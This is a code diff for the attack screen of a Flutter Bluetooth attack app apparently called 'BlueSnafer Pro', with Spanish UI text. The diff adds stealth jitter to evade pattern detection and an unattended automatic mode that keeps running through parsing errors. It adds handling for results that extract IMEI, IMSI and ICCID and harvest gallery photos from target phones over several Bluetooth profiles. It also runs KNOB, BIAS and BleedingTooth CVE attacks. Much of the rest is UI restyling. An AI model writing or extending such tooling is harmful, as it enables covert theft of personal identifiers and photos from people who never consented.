@@ -2839,7 +3263,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
 
       setState(() => _activeAttackCount++);
 
-      if (mounted) {
+      if (mounted && (!_stealthMode || !fromAutomated)) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('⚡ Iniciando $type:$attackLabel en $displayName...', style: const TextStyle(fontSize: 12)),
@@ -2857,8 +3281,9 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
      Map<String, dynamic>? result;
      String finalMessage = '';
 
-     while (attempt <= maxRetries && !success && _isUnattendedRunning) {
-       attempt++;
+while (attempt <= maxRetries && !success) {
+        if (fromAutomated && !_isUnattendedRunning) break;
+        attempt++;
 
        // Ajustar command para OPP_PUSH si hay archivos reales disponibles
        String? actualCommand = command;
@@ -2919,9 +3344,10 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
          _appendLog('  💥 $attackLabel excepción: $e');
        }
 
-       // Si falló y hay más reintentos, esperar con backoff exponencial
-       if (!success && attempt <= maxRetries && _isUnattendedRunning) {
-         final delayMs = baseDelayMs * (1 << (attempt - 1)); // 2^(attempt-1) * baseDelay
+// Si falló y hay más reintentos, esperar con backoff exponencial
+        if (!success && attempt <= maxRetries) {
+         var delayMs = baseDelayMs * (1 << (attempt - 1)); // 2^(attempt-1) * baseDelay
+         if (_stealthMode) { delayMs += _stealthRng.nextInt(3000); } // jitter anticaptura de patrones
          final delaySec = delayMs ~/ 1000;
          if (delaySec > 0) {
            _appendLog('  ⏳ Esperando ${delaySec}s antes de reintento...');
@@ -2944,6 +3370,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
         }
 
         // === Procesar resultado final ===
+      try {
        final packets = result?['packets'];
        final effectiveness = result?['effectiveness'];
        final services = result?['services'];
@@ -3078,6 +3505,142 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
               _collectedData.add('📁 [$targetName] MAP carpetas: ${(folders as List).take(5).join(', ')}');
             }
            }
+
+          // === Captura AT Identity Extraction ===
+          if (type == 'at_extract_identity') {
+            final imei = result?['imei']?.toString() ?? '';
+            final imsi = result?['imsi']?.toString() ?? '';
+            final iccid = result?['iccid']?.toString() ?? '';
+            if (imei.isNotEmpty) {
+              final luhn = result?['imeiLuhnValid'] == true ? ' (Luhn OK)' : ' (Luhn inválido)';
+              _collectedData.add('📱 [$targetName] IMEI: $imei$luhn');
+            }
+            if (imsi.isNotEmpty) _collectedData.add('🪪 [$targetName] IMSI: $imsi');
+            if (iccid.isNotEmpty) _collectedData.add('💳 [$targetName] ICCID: $iccid');
+            if (imei.isEmpty && imsi.isEmpty) {
+              final err = result?['note'] ?? result?['error'] ?? 'sin canal AT';
+              _collectedData.add('🆔 [$targetName] AT identity falló: $err');
+            }
+          }
+
+          // === Captura Gallery Photos Extraction ===
+          if (type == 'extract_images') {
+            final images = result?['images'];
+            final count = result?['imagesCount'] ?? (images is List ? images.length : 0);
+            final totalBytes = result?['totalBytes'] ?? 0;
+            if (count is int && count > 0) {
+              _collectedData.add('📸 [$targetName] Galería: $count fotos extraídas ($totalBytes bytes)');
+              if (images is List && images.isNotEmpty) {
+                for (final img in images.take(3)) {
+                  _collectedData.add('   🖼️ ${(img as Map)['name']} (${(img as Map)['size']} bytes)');
+                }
+              }
+            } else {
+              final err = result?['note'] ?? result?['error'] ?? 'galería no accesible';
+              _collectedData.add('📸 [$targetName] Galería falló: $err');
+            }
+          }
+
+          // === Captura MediaStore Enhanced ===
+          if (type == 'mediastore_enhanced') {
+            final images = result?['images'];
+            final count = result?['imagesCount'] ?? (images is List ? images.length : 0);
+            final totalBytes = result?['totalBytes'] ?? 0;
+            if (count is int && count > 0) {
+              _collectedData.add('📸 [$targetName] MediaStore Enhanced: $count imógenes ($totalBytes bytes)');
+              if (images is List && images.isNotEmpty) {
+                for (final img in images.take(3)) {
+                  _collectedData.add('   🖼️ ${(img as Map)['name']} (${(img as Map)['size']} bytes)');
+                }
+              }
+            } else {
+              final err = result?['error'] ?? 'MediaStore no accesible';
+              _collectedData.add('📸 [$targetName] MediaStore Enhanced falló: $err');
+            }
+          }
+
+          // === Captura GATT Image Read ===
+          if (type == 'gatt_image_read') {
+            final images = result?['images'];
+            final count = result?['imagesCount'] ?? (images is List ? images.length : 0);
+            final totalBytes = result?['totalBytes'] ?? 0;
+            final charsScanned = result?['characteristicsScanned'] ?? 0;
+            if (count is int && count > 0) {
+              _collectedData.add('📸 [$targetName] GATT Image Read: $count imógenes ($totalBytes bytes, $charsScanned chars escaneados)');
+              if (images is List && images.isNotEmpty) {
+                for (final img in images.take(3)) {
+                  _collectedData.add('   🖼️ ${(img as Map)['name']} (${(img as Map)['size']} bytes)');
+                }
+              }
+            } else {
+              _collectedData.add('📸 [$targetName] GATT Image Read: $charsScanned characteristics escaneados, sin imógenes');
+            }
+          }
+
+          // === Captura Quick Share / Nearby Receptor (imágenes compartidas) ===
+          if (type == 'quickshare_server') {
+            final images = result?['images'];
+            final count = result?['imagesCount'] ?? (images is List ? images.length : 0);
+            final totalBytes = result?['totalBytes'] ?? 0;
+            if (count is int && count > 0) {
+              _collectedData.add('🌟 [$targetName] Quick Share Receptor: $count imógenes recibidas ($totalBytes bytes)');
+              if (images is List && images.isNotEmpty) {
+                for (final img in images.take(3)) {
+                  _collectedData.add('   🖼️ ${(img as Map)['name']} (${(img as Map)['size']} bytes)');
+                }
+              }
+            } else {
+              final err = result?['message'] ?? result?['error'] ?? 'el target no compartió';
+              _collectedData.add('🌟 [$targetName] Quick Share Receptor: $err');
+            }
+          }
+
+          // === Captura de familias de capa de enlace: KNOB / BIAS / BleedingTooth ===
+          if (type == 'knob' || type == 'cve_2021_10134_bias' || type == 'cve_2020_26558_bleeding') {
+            final cve = result?['cve'] ?? '';
+            final rootUsed = result?['rootUsed'] == true;
+            final note = result?['note'];
+            final rootMsg = rootUsed ? ' (ROOT)' : ' (sin root, limitado)';
+            if (result?['success'] == true) {
+              _collectedData.add('🔒 [$targetName] $type$rootMsg completado (CVE $cve)${note != null ? ' - $note' : ''}');
+            } else {
+              _collectedData.add('⚠️ [$targetName] $type falló: ${result?['message'] ?? result?['error'] ?? 'sin señal'}');
+            }
+          }
+
+          // === Captura OPP Server Mode ===
+          if (type == 'opp_server_mode') {
+            final images = result?['images'];
+            final count = result?['imagesCount'] ?? (images is List ? images.length : 0);
+            final totalBytes = result?['totalBytes'] ?? 0;
+            if (count is int && count > 0) {
+              _collectedData.add('📸 [$targetName] OPP Server: $count imógenes recibidas ($totalBytes bytes)');
+              if (images is List && images.isNotEmpty) {
+                for (final img in images.take(3)) {
+                  _collectedData.add('   🖼️ ${(img as Map)['name']} (${(img as Map)['size']} bytes)');
+                }
+              }
+            } else {
+              _collectedData.add('📸 [$targetName] OPP Server: sin imógenes recibidas (target no conectó)');
+            }
+          }
+
+          // === Captura MAP Image Extract ===
+          if (type == 'map_image_extract') {
+            final images = result?['images'];
+            final count = result?['imagesCount'] ?? (images is List ? images.length : 0);
+            final totalBytes = result?['totalBytes'] ?? 0;
+            if (count is int && count > 0) {
+              _collectedData.add('📸 [$targetName] MAP Image Extract: $count imógenes ($totalBytes bytes)');
+              if (images is List && images.isNotEmpty) {
+                for (final img in images.take(3)) {
+_collectedData.add('   🖼️ ${(img as Map)['name']} (${(img as Map)['size']} bytes)');
+                }
+              }
+            } else {
+              _collectedData.add('📸 [$targetName] MAP Image Extract: sin imógenes adjuntas');
+            }
+          }
         if (characteristics != null) {
          _collectedData.add('🔗 [$targetName] $characteristics características encontradas');
        }
@@ -3090,12 +3653,19 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
         _collectedData.add('✅ [$targetName] $type:$attackLabel completado');
         }
 
+      } catch (_) {
+        // Blindaje: un parseo inesperado de resultados nunca detiene el modo automático.
+      }
+
       // Registro en suggestion engine deshabilitado temporalmente
       
 
       if (mounted) {
        setState(() {
-         if (success) { _executedAttacks.add(type); }
+         if (success) {
+           _executedAttacks.add(type);
+           if (_isUnattendedRunning) _sessionCompletedAttacks.add(type);
+         }
          _getSuggestion();
        });
        _saveState();
@@ -3162,20 +3732,27 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
               Container(
                 padding: const EdgeInsets.all(6),
                 decoration: BoxDecoration(
-                  color: Colors.cyanAccent.withOpacity(0.15),
+                  color: Colors.cyanAccent.withValues(alpha: 0.15),
                   borderRadius: BorderRadius.circular(20),
-                  border: Border.all(color: Colors.cyanAccent.withOpacity(0.3), width: 1),
+                  border: Border.all(color: Colors.cyanAccent.withValues(alpha: 0.3), width: 1),
                 ),
                 child: const Icon(Icons.bluetooth, color: Colors.cyanAccent, size: 18),
               ),
               const SizedBox(width: 10),
-              const Text('BlueSnafer Pro', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.white)),
+              Column(
+                mainAxisAlignment: MainAxisAlignment.center,
+                crossAxisAlignment: CrossAxisAlignment.start,
+                children: const [
+                  Text('BlueSnafer Pro', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.white)),
+                  Text('v1.1.0 (6)', style: TextStyle(fontSize: 9, color: Colors.white38)),
+                ],
+              ),
               const Spacer(),
               // Botón escanear pequeño
               Container(
                 margin: const EdgeInsets.only(right: 4),
                 decoration: BoxDecoration(
-                  color: Colors.indigoAccent.withOpacity(0.2),
+                  color: Colors.indigoAccent.withValues(alpha: 0.2),
                   borderRadius: BorderRadius.circular(20),
                 ),
                 child: IconButton(
@@ -3199,12 +3776,21 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                     case 'adaptive':
                       setState(() => _enableAdaptiveIntelligence = !_enableAdaptiveIntelligence);
                       _appendLog('⚙️ IA: ${_enableAdaptiveIntelligence ? "ON" : "OFF"}'); break;
+                    case 'advanced':
+                      setState(() => _enableAdvancedSystem = !_enableAdvancedSystem);
+                      _appendLog('⚙️ Sistema avanzado: ${_enableAdvancedSystem ? "ON" : "OFF"}'); break;
                     case 'stealth':
                       setState(() => _stealthMode = !_stealthMode);
                       _appendLog('🎭 Sigilo: ${_stealthMode ? "ON" : "OFF"}'); break;
                     case 'persistence':
                       setState(() => _enablePersistence = !_enablePersistence);
                       _appendLog('🕵️ Persistencia: ${_enablePersistence ? "ON" : "OFF"}'); break;
+                    case 'patterns':
+                      setState(() => _enablePatternAnalysis = !_enablePatternAnalysis);
+                      _appendLog('📊 Patrones: ${_enablePatternAnalysis ? "ON" : "OFF"}'); break;
+                    case 'network':
+                      setState(() => _enableNetworkAnalysis = !_enableNetworkAnalysis);
+                      _appendLog('🌐 Red: ${_enableNetworkAnalysis ? "ON" : "OFF"}'); break;
                     case 'auto':
                       if (_selectedDevice != null) _startUnattendedMode();
                       break;
@@ -3215,8 +3801,11 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                 itemBuilder: (context) => [
                   CheckedPopupMenuItem(value: 'parallel', checked: _enableParallelExecution, child: const Text('Paralelo', style: TextStyle(fontSize: 13))),
                   CheckedPopupMenuItem(value: 'adaptive', checked: _enableAdaptiveIntelligence, child: const Text('IA adaptativa', style: TextStyle(fontSize: 13))),
+                  CheckedPopupMenuItem(value: 'advanced', checked: _enableAdvancedSystem, child: const Text('Sistema avanzado', style: TextStyle(fontSize: 13))),
                   CheckedPopupMenuItem(value: 'stealth', checked: _stealthMode, child: const Text('Sigilo', style: TextStyle(fontSize: 13))),
                   CheckedPopupMenuItem(value: 'persistence', checked: _enablePersistence, child: const Text('Persistencia', style: TextStyle(fontSize: 13))),
+                  CheckedPopupMenuItem(value: 'patterns', checked: _enablePatternAnalysis, child: const Text('Análisis patrones', style: TextStyle(fontSize: 13))),
+                  CheckedPopupMenuItem(value: 'network', checked: _enableNetworkAnalysis, child: const Text('Análisis de red', style: TextStyle(fontSize: 13))),
                   const PopupMenuDivider(),
                   const PopupMenuItem(value: 'auto', child: Text('▶ Iniciar automático', style: TextStyle(fontSize: 13))),
                   const PopupMenuItem(value: 'report', child: Text('📊 Ver reporte', style: TextStyle(fontSize: 13))),
@@ -3230,163 +3819,65 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       ),
       body: SafeArea(
         child: Column(
-        children: [
-          Expanded(
-            child: _devices.isEmpty
-              ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
-                  Container(padding: const EdgeInsets.all(32), decoration: BoxDecoration(color: Colors.white.withOpacity(0.02), shape: BoxShape.circle), child: const Icon(Icons.radar, size: 64, color: Colors.white10)),
-                  const SizedBox(height: 24),
-                  const Text('SIN OBJETIVOS', style: TextStyle(color: Colors.white24, fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 1)),
-                  const SizedBox(height: 8),
-                  TextButton.icon(icon: const Icon(Icons.bluetooth_searching, size: 16), label: const Text('ESCANEAR'), onPressed: _scan),
-                ]))
-              : ListView.builder(
-                  padding: const EdgeInsets.fromLTRB(16, 8, 16, 8),
-                  itemCount: _devices.length,
-                  itemBuilder: (context, i) {
-                    final device = _devices[i];
-                    final addr = device['address']?.toString() ?? '??:??:??';
-                    final displayName = device_utils.getDeviceDisplayName(device);
-                    final isSelected = _selectedDevice == device;
-                    final devType = device_utils.detectDeviceType(device);
-                    final icon = _getDeviceIcon(devType);
-                    return GestureDetector(
-                      onTap: () {
-                        setState(() {
-                          _selectedDevice = device;
-                          _appendLog('🎯 LOCK: $displayName');
-                        });
-                        _analyzeWithAI(device);
-                        _getSuggestion();
-                        _saveState();
-                      },
-                      onLongPress: () => _startUnattendedMode(),
-                      child: Container(
-                        margin: const EdgeInsets.only(bottom: 8),
-                        padding: const EdgeInsets.all(12),
-                        decoration: BoxDecoration(
-                          color: isSelected ? Colors.indigoAccent.withOpacity(0.08) : Colors.white.withOpacity(0.03),
-                          borderRadius: BorderRadius.circular(14),
-                          border: isSelected ? Border.all(color: Colors.indigoAccent.withOpacity(0.3), width: 1) : null,
-                        ),
-                        child: Row(children: [
-                          Container(
-                            padding: const EdgeInsets.all(10),
-                            decoration: BoxDecoration(
-                              color: Colors.white.withOpacity(0.04),
-                              borderRadius: BorderRadius.circular(12),
-                            ),
-                            child: Icon(icon, color: isSelected ? Colors.indigoAccent : Colors.white54, size: 22),
-                          ),
-                          const SizedBox(width: 14),
-                          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-                            Text(displayName, style: TextStyle(color: isSelected ? Colors.indigoAccent : Colors.white, fontWeight: FontWeight.w600, fontSize: 13), maxLines: 1, overflow: TextOverflow.ellipsis),
-                            const SizedBox(height: 3),
-                            Row(children: [
-                              Container(
-                                padding: const EdgeInsets.symmetric(horizontal: 5, vertical: 1),
-                                decoration: BoxDecoration(
-                                  color: devType == 'unknown' ? Colors.grey.withOpacity(0.15) : Colors.purpleAccent.withOpacity(0.12),
-                                  borderRadius: BorderRadius.circular(3),
-                                ),
-                                child: Text(devType == 'unknown' ? '?' : devType.toUpperCase(),
-                                  style: TextStyle(
-                                    color: devType == 'unknown' ? Colors.grey : Colors.purpleAccent,
-                                    fontSize: 8, fontWeight: FontWeight.bold)),
-                              ),
-                              const SizedBox(width: 6),
-                              Text(addr, style: const TextStyle(color: Colors.white24, fontSize: 8, fontFamily: 'monospace')),
-                              if (device['rssi'] != null) ...[
-                                const SizedBox(width: 6),
-                                Text('${device['rssi']}dBm', style: const TextStyle(color: Colors.white24, fontSize: 8)),
-                              ],
-                            ]),
-                          ])),
-                          if (isSelected) Container(
-                            padding: const EdgeInsets.all(4),
-                            decoration: BoxDecoration(color: Colors.greenAccent.withOpacity(0.15), borderRadius: BorderRadius.circular(10)),
-                            child: const Icon(Icons.check_circle, color: Colors.greenAccent, size: 16),
-                          ),
-                        ]),
-                      ),
-                    );
-                  },
-                ),
-          ),
-          _buildTerminalBar(),
-        ],
+          children: [
+            _buildTargetHud(),
+            Expanded(
+              child: TabBarView(
+                controller: _tabController,
+                children: [
+                  _buildHomeTab(),
+                  _buildAiTab(),
+                ],
+              ),
+            ),
+          ],
+        ),
+      ),
+      bottomNavigationBar: _buildBottomTabBar(),
+    );
+  }
+
+  Widget _buildBottomTabBar() {
+    return Container(
+      decoration: const BoxDecoration(
+        color: Color(0xFF0B1220),
+        border: Border(top: BorderSide(color: Colors.white10)),
+      ),
+      child: SafeArea(
+        top: false,
+        child: TabBar(
+          controller: _tabController,
+          indicatorColor: Colors.cyanAccent,
+          indicatorSize: TabBarIndicatorSize.label,
+          labelColor: Colors.cyanAccent,
+          unselectedLabelColor: Colors.white38,
+          labelStyle: const TextStyle(fontSize: 10, fontWeight: FontWeight.bold),
+          unselectedLabelStyle: const TextStyle(fontSize: 10),
+          tabs: const [
+            Tab(icon: Icon(Icons.radar, size: 18), text: 'RADAR'),
+            Tab(icon: Icon(Icons.psychology, size: 18), text: 'DATOS'),
+          ],
         ),
       ),
     );
   }
 
 
-  Widget _buildStepIndicator() {
-    final step = _currentStep;
-    final steps = ['1', '2', '3', '4'];
-    final labels = ['Escanear', 'Seleccionar', 'Atacar', 'Repetir'];
-    return Container(
-      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
-      decoration: BoxDecoration(
-        color: Colors.indigo[900],
-        border: Border(bottom: BorderSide(color: Colors.indigoAccent.withOpacity(0.2))),
-      ),
-      child: Row(
-        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
-        children: List.generate(4, (i) {
-          final isActive = i == step;
-          final isDone = i < step;
-          return Padding(
-            padding: const EdgeInsets.symmetric(horizontal: 2),
-            child: Row(
-              mainAxisSize: MainAxisSize.min,
-              children: [
-                Container(
-                  width: 16,
-                  height: 16,
-                  alignment: Alignment.center,
-                  decoration: BoxDecoration(
-                    color: isDone ? Colors.greenAccent : (isActive ? Colors.cyanAccent : Colors.white10),
-                    shape: BoxShape.circle,
-                  ),
-                  child: Text(
-                    steps[i],
-                    style: TextStyle(
-                      color: isDone ? Colors.black : (isActive ? Colors.black : Colors.white30),
-                      fontSize: 10,
-                      fontWeight: FontWeight.bold,
-                    ),
-                  ),
-                ),
-                const SizedBox(width: 4),
-                Text(
-                  labels[i],
-                  style: TextStyle(
-                    color: isDone ? Colors.greenAccent : (isActive ? Colors.cyanAccent : Colors.white30),
-                    fontSize: 10,
-                    fontWeight: isActive ? FontWeight.bold : FontWeight.normal,
-                  ),
-                ),
-              ],
-            ),
-          );
-        }),
-      ),
-    );
-  }
-
   Widget _buildTargetHud() {
-    if (_selectedDevice == null) return const SizedBox.shrink();
-    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
-    final addr = _selectedDevice!['address']?.toString() ?? '??:??:??';
-    final vendor = _getManufacturer(addr);
-    String hint = _getQuickGuide();
+    final displayName = _selectedDevice == null
+        ? 'SIN OBJETIVO SELECCIONADO'
+        : device_utils.getDeviceDisplayName(_selectedDevice!);
+    final addr = _selectedDevice?['address']?.toString() ?? '—';
+    final vendor = _selectedDevice == null ? 'RADAR' : _getManufacturer(addr);
+    String hint = _selectedDevice == null
+        ? 'Escanea y toca un dispositivo para fijarlo como objetivo'
+        : _getQuickGuide();
 
     return Container(
       width: double.infinity,
       margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
       padding: const EdgeInsets.all(8),
-      decoration: BoxDecoration(color: Colors.indigoAccent.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.indigoAccent.withOpacity(0.3))),
+      decoration: BoxDecoration(color: Colors.indigoAccent.withValues(alpha: 0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.indigoAccent.withValues(alpha: 0.3))),
       child: Column(
         crossAxisAlignment: CrossAxisAlignment.start,
         mainAxisSize: MainAxisSize.min,
@@ -3399,7 +3890,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                 child: Text(
                   '$displayName | $vendor | $addr',
                   style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 10),
-                  maxLines: 1,
+                  maxLines: 2,
                   overflow: TextOverflow.ellipsis,
                 ),
               ),
@@ -3408,10 +3899,10 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
           ),
           const SizedBox(height: 4),
           GestureDetector(
-            onTap: _navigateToSuggestion,
+            onTap: _selectedDevice == null ? null : _navigateToSuggestion,
             child: Container(
               padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
-              decoration: BoxDecoration(color: Colors.cyanAccent.withOpacity(0.1), borderRadius: BorderRadius.circular(6)),
+              decoration: BoxDecoration(color: Colors.cyanAccent.withValues(alpha: 0.1), borderRadius: BorderRadius.circular(6)),
               child: Row(
                 children: [
                   Icon(Icons.touch_app, color: Colors.cyanAccent, size: 12),
@@ -3428,333 +3919,399 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
               ),
             ),
           ),
+          const SizedBox(height: 6),
+          if (_sessionResumable)
+            SizedBox(
+              width: double.infinity,
+              height: 40,
+              child: ElevatedButton(
+                style: ElevatedButton.styleFrom(
+                  backgroundColor: Colors.amberAccent,
+                  foregroundColor: Colors.black,
+                ),
+                onPressed: _resumeSession,
+                child: const FittedBox(
+                  fit: BoxFit.scaleDown,
+                  child: Row(
+                    mainAxisSize: MainAxisSize.min,
+                    children: [
+                      Icon(Icons.history, size: 18),
+                      SizedBox(width: 6),
+                      Text('♻️ REANUDAR SESIÓN INTERRUMPIDA',
+                          style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold)),
+                    ],
+                  ),
+                ),
+              ),
+            ),
+          if (_sessionResumable) const SizedBox(height: 6),
+          SizedBox(
+            width: double.infinity,
+            height: 44,
+            child: ElevatedButton(
+              style: ElevatedButton.styleFrom(
+                backgroundColor: _isUnattendedRunning ? Colors.redAccent : Colors.greenAccent,
+                foregroundColor: Colors.black,
+                disabledBackgroundColor: Colors.white10,
+                disabledForegroundColor: Colors.white30,
+                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
+              ),
+              onPressed: _selectedDevice == null ? null : _startUnattendedMode,
+              child: FittedBox(
+                fit: BoxFit.scaleDown,
+                child: Row(
+                  mainAxisSize: MainAxisSize.min,
+                  children: [
+                    Icon(_isUnattendedRunning ? Icons.stop : Icons.auto_mode, size: 20),
+                    const SizedBox(width: 6),
+                    Text(
+                      _isUnattendedRunning
+                          ? 'DETENER MODO AUTOMÁTICO'
+                          : (_selectedDevice == null ? 'SELECCIONA UN OBJETIVO PARA INICIAR' : 'INICIAR MODO AUTOMÁTICO'),
+                      style: const TextStyle(fontSize: 13, fontWeight: FontWeight.bold, letterSpacing: 0.5),
+                    ),
+                  ],
+                ),
+              ),
+            ),
+          ),
         ],
       ),
     );
   }
 
-  Widget _buildTerminalBar() {
-    return Column(mainAxisSize: MainAxisSize.min, children: [
-      if (true)
-        Container(
-          height: 280, width: double.infinity, margin: const EdgeInsets.fromLTRB(16, 0, 16, 0), padding: const EdgeInsets.all(12),
-          decoration: const BoxDecoration(color: const Color(0xFF0F172A), borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
-          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-            Row(children: [
-              Container(padding: const EdgeInsets.all(4), decoration: BoxDecoration(color: Colors.cyanAccent.withOpacity(0.15), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.cyanAccent.withOpacity(0.3), width: 1)), child: const Icon(Icons.bluetooth, color: Colors.cyanAccent, size: 12)),
-              const SizedBox(width: 8),
-              const Text('BLUESNAFER PRO CONSOLE', style: TextStyle(color: Colors.cyanAccent, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1)),
-              const Spacer(),
-              IconButton(icon: const Icon(Icons.save_alt, color: Colors.blue, size: 16), onPressed: _exportLogs, tooltip: 'Exportar logs', padding: EdgeInsets.zero, constraints: const BoxConstraints()),
-              const SizedBox(width: 8),
-              IconButton(icon: const Icon(Icons.delete_outline, color: Colors.redAccent, size: 16), onPressed: () { setState(() => _log = ['SISTEMA OPERATIVO - STANDBY']); }, tooltip: 'Limpiar consola', padding: EdgeInsets.zero, constraints: const BoxConstraints()),
-            ]),
-            const SizedBox(height: 4),
-            const Divider(color: Colors.white10, height: 1),
-            Expanded(
-              child: ListView.builder(
-                controller: _logScrollController,
-                itemCount: _log.length,
-                itemBuilder: (context, i) {
-                  final entry = _log[i];
-                  // Color-code by type
-                  Color? textColor;
-                  if (entry.startsWith('✅') || entry.contains('ÉXITO') || entry.contains('OK')) {
-                    textColor = Colors.greenAccent;
-                  } else if (entry.startsWith('❌') || entry.contains('FALL') || entry.contains('ERROR')) {
-                    textColor = Colors.redAccent;
-                  } else if (entry.startsWith('⚡') || entry.startsWith('🎯')) {
-                    textColor = Colors.orangeAccent;
-                  } else if (entry.startsWith('📡')) {
-                    textColor = Colors.purpleAccent;
-                  } else if (entry.startsWith('⚠️')) {
-                    textColor = Colors.amber;
-                  } else if (entry.startsWith('💥')) {
-                    textColor = Colors.red;
-                  } else {
-                    textColor = Colors.cyanAccent;
-                  }
-                  return Padding(
-                    padding: const EdgeInsets.only(bottom: 2),
-                    child: Text(entry, style: TextStyle(color: textColor, fontSize: 10, fontFamily: 'monospace')),
-                  );
-                },
-              ),
-            ),
-            
-          ]),
-        ),
-    ]);
-  }
-
   Widget _buildHomeTab() {
-    return _devices.isEmpty
-      ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
-          Container(padding: const EdgeInsets.all(32), decoration: BoxDecoration(color: Colors.white.withOpacity(0.02), shape: BoxShape.circle), child: const Icon(Icons.radar, size: 64, color: Colors.white10)),
-          const SizedBox(height: 24),
-          const Text('SIN OBJETIVOS ACTIVOS', style: TextStyle(color: Colors.white24, fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 1)),
-          const SizedBox(height: 40),
-          SizedBox(width: 200, child: ElevatedButton.icon(icon: const Icon(Icons.radar), label: const Text('ESCANEAR'), onPressed: _scan)),
-        ]))
-      : ListView.builder(
-          padding: const EdgeInsets.all(16), itemCount: _devices.length,
-          itemBuilder: (context, i) {
-            final device = _devices[i];
-            final addr = device['address']?.toString() ?? '??:??:??';
-            final displayName = device_utils.getDeviceDisplayName(device);
-            final isSelected = _selectedDevice == device;
-            return GestureDetector(
-              onTap: () {
-                setState(() {
-                  _selectedDevice = device;
-                  _appendLog('🎯 LOCK: $displayName');
-                });
-                _analyzeWithAI(device);
-                _getSuggestion();
-                _saveState(); // Guardar selección
+    return Column(children: [
+      Expanded(
+        child: _devices.isEmpty
+          ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
+              Container(padding: const EdgeInsets.all(32), decoration: BoxDecoration(color: Colors.white.withValues(alpha: 0.02), shape: BoxShape.circle), child: const Icon(Icons.radar, size: 64, color: Colors.white10)),
+              const SizedBox(height: 24),
+              const Text('SIN OBJETIVOS ACTIVOS', style: TextStyle(color: Colors.white24, fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 1)),
+              const SizedBox(height: 40),
+              SizedBox(width: 200, child: ElevatedButton.icon(icon: const Icon(Icons.radar), label: const Text('ESCANEAR'), onPressed: _scan)),
+            ]))
+          : ListView.builder(
+              padding: const EdgeInsets.all(16), itemCount: _devices.length,
+              itemBuilder: (context, i) {
+                final device = _devices[i];
+                final addr = device['address']?.toString() ?? '??:??:??';
+                final displayName = device_utils.getDeviceDisplayName(device);
+                final isSelected = _selectedDevice == device;
+                return GestureDetector(
+                  onTap: () {
+                    setState(() {
+                      _selectedDevice = device;
+                      _appendLog('🎯 LOCK: $displayName');
+                    });
+                    _analyzeWithAI(device);
+                    _getSuggestion();
+                    _saveState(); // Guardar selección
+                  },
+                  onLongPress: () => _startUnattendedMode(),
+                  child: Card(margin: const EdgeInsets.only(bottom: 12), child: Padding(padding: const EdgeInsets.all(16), child: Row(children: [
+                    Container(padding: const EdgeInsets.all(10), decoration: BoxDecoration(color: (isSelected ? Colors.indigoAccent : Colors.white).withValues(alpha: 0.05), borderRadius: BorderRadius.circular(12)), child: Icon(_getDeviceIcon(device_utils.detectDeviceType(device)), color: isSelected ? Colors.indigoAccent : Colors.white54, size: 24)),
+                    const SizedBox(width: 16),
+                    Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+                      Text(displayName, style: TextStyle(color: isSelected ? Colors.indigoAccent : Colors.white, fontWeight: FontWeight.bold, fontSize: 14)),
+                      const SizedBox(height: 4),
+                      Row(children: [
+                        Container(padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2), decoration: BoxDecoration(color: Colors.purpleAccent.withValues(alpha: 0.15), borderRadius: BorderRadius.circular(4)),
+                          child: Text(device_utils.detectDeviceType(device).toUpperCase(), style: const TextStyle(color: Colors.purpleAccent, fontSize: 9, fontWeight: FontWeight.bold))),
+                        const SizedBox(width: 8),
+                        Flexible(
+                          child: Text('$addr | ${device['rssi']} dBm', style: const TextStyle(color: Colors.white24, fontSize: 9, fontFamily: 'monospace'), overflow: TextOverflow.ellipsis, maxLines: 1),
+                        ),
+                      ]),
+                    ])),
+                    if (isSelected) const Icon(Icons.check_circle, color: Colors.greenAccent, size: 20),
+                  ]))),
+                );
               },
-              child: Card(margin: const EdgeInsets.only(bottom: 12), child: Padding(padding: const EdgeInsets.all(16), child: Row(children: [
-                Container(padding: const EdgeInsets.all(10), decoration: BoxDecoration(color: (isSelected ? Colors.indigoAccent : Colors.white).withOpacity(0.05), borderRadius: BorderRadius.circular(12)), child: Icon(_getDeviceIcon(device_utils.detectDeviceType(device)), color: isSelected ? Colors.indigoAccent : Colors.white54, size: 24)),
-                const SizedBox(width: 16),
